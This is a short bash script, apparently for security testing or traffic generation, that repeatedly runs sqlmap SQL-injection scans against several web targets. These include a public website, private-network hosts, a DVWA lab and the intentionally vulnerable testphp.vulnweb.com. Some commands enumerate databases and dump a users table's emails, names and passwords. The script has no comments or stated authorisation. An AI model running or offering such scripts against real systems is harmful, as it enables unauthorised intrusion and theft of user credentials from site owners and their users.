#!/bin/bash
for i in $(seq 1 5)
do
	sqlmap -u http://www.mqtt-dashboard.com/?id=4     	
	sqlmap -u https://192.168.1.184/index.jsp?name=admin       
	sqlmap -u http://192.168.1.152/?id=3 
	sqlmap -u http://192.168.1.190/webmail/src/login.php?username=user1 	
	sqlmap -u http://192.168.1.195/dvwa/vulnerabilities/sqli/?id=53 
	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns 
	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C email,name,pass --dump      
	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1        
	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 
	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables 

done




